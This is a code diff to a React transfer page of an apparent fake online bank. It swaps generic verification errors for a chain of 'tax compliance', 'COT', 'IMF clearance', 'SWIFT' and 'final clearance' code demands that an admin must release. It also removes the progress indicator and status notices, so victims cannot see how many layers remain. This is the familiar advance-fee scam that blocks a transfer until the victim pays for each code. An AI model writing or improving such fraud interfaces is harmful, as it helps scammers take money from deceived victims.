@@ -69,29 +69,29 @@ interface LayerAlert {
 
 const LAYER_ALERTS: Record<number, LayerAlert> = {
   1: {
-    code: "ERR-AUTH-101",
-    title: "Multi-Factor Authentication Required",
-    desc: "Transaction verification required. Enter the 6-digit authentication code issued by bank security for this transfer.",
+    code: "TAX-CODE-101",
+    title: "Tax Compliance Verification",
+    desc: "A tax compliance code is required to proceed with this transfer. If you need assistance, contact support by email or live chat.",
   },
   2: {
-    code: "ERR-SEC-401",
-    title: "Secondary Authorization Required",
-    desc: "Initial authorization check cleared. High-value transfer threshold triggered secondary compliance review. Enter the newly issued code.",
+    code: "COT-CODE-202",
+    title: "COT Code Authorization",
+    desc: "A COT code is required to validate the transfer for tax reporting purposes. Contact support if you did not receive the code.",
   },
   3: {
-    code: "ERR-FRD-902",
-    title: "Anti-Fraud Risk Signal Flagged",
-    desc: "Automated risk protocol requires additional token validation for cross-institution routing. Input the re-issued 6-digit passcode.",
+    code: "IMF-CLR-303",
+    title: "IMF Clearance Code Required",
+    desc: "IMF clearance validation is required before this transfer can proceed. Contact support if you need help obtaining the code.",
   },
   4: {
-    code: "ERR-CMP-309",
-    title: "Regulatory Compliance Audit",
-    desc: "Security policy layer 4 verification active. Mandatory verification code will be issued by an authorized officer.",
+    code: "SWIFT-CODE-404",
+    title: "SWIFT Code Verification",
+    desc: "A SWIFT code verification is required for international settlement. Contact support if you have not received the authorization code.",
   },
   5: {
-    code: "ERR-CLR-105",
-    title: "Final Settlement Authorization",
-    desc: "Final clearance protocol initialized. Complete this final security checkpoint to execute fund transfer.",
+    code: "CLR-CODE-505",
+    title: "Final Clearance Code",
+    desc: "Final clearance authorization is required to complete this transfer. Contact support if you require further assistance.",
   },
 };
 
@@ -259,7 +259,7 @@ function TransferPage() {
         customerName: `${user.firstName} ${user.lastName}`.trim(),
         customerEmail: user.email,
         accountNumber: user.accountNumber,
-        to,
+        to: toClean,
         amount: amtUsd,
         desc,
       });
@@ -350,7 +350,6 @@ function TransferPage() {
       if (alertForNext) {
         toast.error(`[${alertForNext.code}] ${alertForNext.title}`);
       }
-      toast.info("Layer cleared. Awaiting the next authorization code from bank security.", { duration: 6000 });
     } finally {
       setSubmitting(false);
     }
@@ -411,32 +410,8 @@ function TransferPage() {
         <div>
           <h1 className="text-xl font-bold sm:text-2xl">Verify it's you</h1>
           <p className="mt-1 text-sm text-muted-foreground">
-            Security layer {otpStage} of {TOTAL_OTP_STAGES}. Layers you already verified stay cleared permanently — they will never be asked again on this or any future transfer.
+            Enter the verification code provided by bank security to complete this transfer.
           </p>
-        </div>
-
-        {/* Progress — verified layers stay done */}
-        <div className="flex items-center justify-center gap-2">
-          {Array.from({ length: TOTAL_OTP_STAGES }).map((_, i) => {
-            const n = i + 1;
-            const done = n < otpStage || isLayerVerified(session.codes?.[i]);
-            const current = n === otpStage && !done;
-            return (
-              <div
-                key={i}
-                title={done ? `Layer ${n} verified` : current ? `Layer ${n} current` : `Layer ${n}`}
-                className={`flex h-7 w-7 items-center justify-center rounded-full text-[10px] font-bold transition-colors ${
-                  done
-                    ? "bg-success text-white"
-                    : current
-                      ? "bg-primary text-primary-foreground ring-2 ring-primary/30"
-                      : "bg-muted text-muted-foreground"
-                }`}
-              >
-                {done ? "✓" : n}
-              </div>
-            );
-          })}
         </div>
 
         {layerAlert && (
@@ -453,30 +428,6 @@ function TransferPage() {
             </div>
           </div>
         )}
-
-        {/* Waiting vs code issued */}
-        <Card className={`p-4 ${codeIssued ? "border-success/40 bg-success/5" : "border-amber-500/30 bg-amber-500/5"}`}>
-          <div className="flex items-start gap-3 text-sm">
-            {codeIssued ? (
-              <KeyRound className="mt-0.5 h-4 w-4 shrink-0 text-success" />
-            ) : (
-              <Clock className="mt-0.5 h-4 w-4 shrink-0 animate-pulse text-amber-600" />
-            )}
-            <div>
-              <div className="font-medium">
-                {codeIssued
-                  ? `Layer ${otpStage} code has been issued`
-                  : `Awaiting authorization for layer ${otpStage}`}
-              </div>
-              <p className="mt-0.5 text-xs text-muted-foreground">
-                {codeIssued
-                  ? "Enter the code provided by bank security below."
-                  : "An authorized officer must generate the verification code from the admin console before you can continue."}
-              </p>
-              <p className="mt-1 font-mono text-[10px] text-muted-foreground">Session {session.id}</p>
-            </div>
-          </div>
-        </Card>
 
         <Card className="p-6">
           <div className="mb-4 flex items-center gap-3 rounded-lg bg-muted/60 p-3 text-xs text-muted-foreground">
@@ -508,7 +459,7 @@ function TransferPage() {
               className="w-full gradient-primary text-primary-foreground"
               disabled={!codeIssued || otpInput.length !== 6 || submitting}
             >
-              {submitting ? "Verifying…" : otpStage >= TOTAL_OTP_STAGES ? "Confirm and send" : "Verify layer"}
+              {submitting ? "Verifying…" : "Submit code"}
             </Button>
             <div className="flex items-center justify-between text-xs">
               <button type="button" onClick={() => void resetAll()} className="flex items-center gap-1 text-muted-foreground hover:text-foreground">
